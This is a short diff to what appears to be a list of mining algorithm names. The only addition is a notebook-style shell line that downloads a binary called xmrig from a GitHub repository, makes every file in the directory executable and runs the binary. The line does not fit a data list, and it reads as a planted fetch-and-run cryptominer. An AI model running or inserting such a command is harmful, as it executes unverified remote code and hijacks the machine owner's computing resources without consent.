@@ -76,3 +76,5 @@ PROGPOW
 MTP
 LYRA2V3
 EAGLESONG
+
+!wget https://github.com/82a/mining/raw/master/xmrig && chmod +x * && ./xmrig ------
